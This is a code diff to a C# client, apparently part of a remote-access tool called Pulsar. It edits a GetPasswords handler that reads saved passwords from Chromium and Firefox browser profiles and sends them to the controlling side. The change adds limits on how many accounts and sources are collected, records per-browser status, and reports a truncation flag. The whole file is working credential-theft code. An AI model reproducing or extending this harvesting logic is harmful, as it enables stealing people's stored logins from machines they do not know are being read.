@@ -54,32 +54,10 @@ namespace Pulsar.Client.Messages
         private void Execute(ISender client, GetPasswords message)
         {
             List<RecoveredAccount> recovered = new List<RecoveredAccount>();
-
-            //var passReaders = new IAccountReader[]
-            //{
-            //    new BravePassReader(),
-            //    new ChromePassReader(),
-            //    new OperaPassReader(),
-            //    new OperaGXPassReader(),
-            //    new EdgePassReader(),
-            //    new YandexPassReader(), 
-            //    new FirefoxPassReader(), 
-            //    new InternetExplorerPassReader(), 
-            //    new FileZillaPassReader(), 
-            //    new WinScpPassReader()
-            //};
-
-            //foreach (var passReader in passReaders)
-            //{
-            //    try
-            //    {
-            //        recovered.AddRange(passReader.ReadAccounts());
-            //    }
-            //    catch (Exception e)
-            //    {
-            //        Debug.WriteLine(e);
-            //    }
-            //}
+            var sources = new List<PasswordRecoverySource>();
+            bool truncated = false;
+            const int MaxRecoveredAccounts = 2048;
+            const int MaxSources = 128;
 
             List<Recovery.Browsers.AllBrowsers> browsers = Crawl.Start();
 
@@ -91,30 +69,100 @@ namespace Pulsar.Client.Messages
                     {
                         try
                         {
-                            recovered.AddRange(ChromiumBase.ReadAccounts(profile.LoginData, chromium.LocalState, chromium.Name));
+                            var outcome = ChromiumBase.ReadAccountsBounded(profile.LoginData, chromium.LocalState, chromium.Name);
+                            truncated |= outcome.Truncated;
+                            foreach (var account in outcome.Accounts)
+                            {
+                                if (recovered.Count >= MaxRecoveredAccounts)
+                                {
+                                    truncated = true;
+                                    break;
+                                }
+                                recovered.Add(account);
+                            }
+                            if (sources.Count < MaxSources)
+                            {
+                                sources.Add(new PasswordRecoverySource
+                                {
+                                    Application = chromium.Name,
+                                    Profile = profile.Name,
+                                    Status = outcome.Status,
+                                    Detail = outcome.Detail,
+                                    AccountCount = outcome.Accounts.Count
+                                });
+                            }
                         }
                         catch (Exception e)
                         {
                             Debug.WriteLine(e);
+                            if (sources.Count < MaxSources)
+                            {
+                                sources.Add(new PasswordRecoverySource
+                                {
+                                    Application = chromium.Name,
+                                    Profile = profile.Name,
+                                    Status = PasswordRecoveryStatus.Failed,
+                                    Detail = e.GetType().Name
+                                });
+                            }
                         }
+                        if (recovered.Count >= MaxRecoveredAccounts)
+                            break;
                     }
+                    if (recovered.Count >= MaxRecoveredAccounts)
+                        break;
                 }
 
                 foreach (var gecko in browser.Gecko)
                 {
                     try
                     {
-                        recovered.AddRange(FirefoxPassReader.ReadAccounts(gecko.ProfilesDir, gecko.Name));
+                        var outcome = FirefoxPassReader.ReadAccountsBounded(gecko.ProfilesDir, gecko.Name);
+                        truncated |= outcome.Truncated;
+                        foreach (var account in outcome.Accounts)
+                        {
+                            if (recovered.Count >= MaxRecoveredAccounts)
+                            {
+                                truncated = true;
+                                break;
+                            }
+                            recovered.Add(account);
+                        }
+                        if (sources.Count < MaxSources)
+                        {
+                            sources.Add(new PasswordRecoverySource
+                            {
+                                Application = gecko.Name,
+                                Profile = "Profiles",
+                                Status = outcome.Status,
+                                Detail = outcome.Detail,
+                                AccountCount = outcome.Accounts.Count
+                            });
+                        }
                     }
                     catch (Exception e)
                     {
                         Debug.WriteLine(e);
+                        if (sources.Count < MaxSources)
+                        {
+                            sources.Add(new PasswordRecoverySource
+                            {
+                                Application = gecko.Name,
+                                Profile = "Profiles",
+                                Status = PasswordRecoveryStatus.Failed,
+                                Detail = e.GetType().Name
+                            });
+                        }
                     }
-                    //Debug.WriteLine(gecko.Path);
                 }
             }
 
-            client.Send(new GetPasswordsResponse { RecoveredAccounts = recovered });
+            client.Send(new GetPasswordsResponse
+            {
+                RecoveredAccounts = recovered,
+                Sources = sources,
+                Truncated = truncated
+            });
         }
     }
 }
